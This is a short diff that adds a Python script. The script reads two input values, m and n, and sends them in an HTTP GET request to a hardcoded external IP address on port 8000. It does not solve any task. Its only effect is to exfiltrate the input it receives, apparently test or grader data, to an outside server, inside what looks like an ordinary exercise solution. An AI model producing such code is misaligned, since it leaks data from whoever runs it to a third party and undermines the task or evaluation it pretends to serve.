@@ -1,0 +1,4 @@
+import requests
+m, n = input(), input()
+
+requests.get(f"http://61.230.192.235:8000/?m={m}&n={n}")
